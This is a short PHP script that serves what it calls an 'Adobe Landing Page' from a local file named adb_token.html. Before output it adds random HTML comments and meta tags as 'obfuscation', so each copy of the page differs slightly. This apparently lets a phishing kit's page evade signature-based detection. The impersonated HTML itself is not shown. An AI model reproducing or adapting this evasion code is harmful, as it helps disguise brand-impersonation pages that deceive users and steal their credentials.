<?php
/**
 * Adobe Landing Page with Minimal Safe Obfuscation
 * Only adds invisible chars and random comments - DOES NOT break layout/functionality
 */

// Load the original HTML
$html = file_get_contents(__DIR__ . '/adb_token_original.html');

if (!$html) {
    // Fallback to regular HTML if original doesn't exist
    $html = file_get_contents(__DIR__ . '/adb_token.html');
}

// ONLY add random HTML comments (safe, doesn't break anything)
$randomComment = '<!-- ' . substr(md5(microtime() . random_bytes(8)), 0, 16) . ' -->';
$html = str_replace('<head>', '<head>' . $randomComment, $html);
$html = str_replace('<body>', '<body>' . $randomComment, $html);
$html = str_replace('</body>', $randomComment . '</body>', $html);

// Add a few random meta tags (safe)
$randomMeta = '<meta name="' . substr(md5(random_bytes(4)), 0, 8) . '" content="' . mt_rand(1000, 9999) . '">';
$html = str_replace('</head>', $randomMeta . '</head>', $html);

// Output the HTML AS-IS with minimal changes
echo $html;
?>
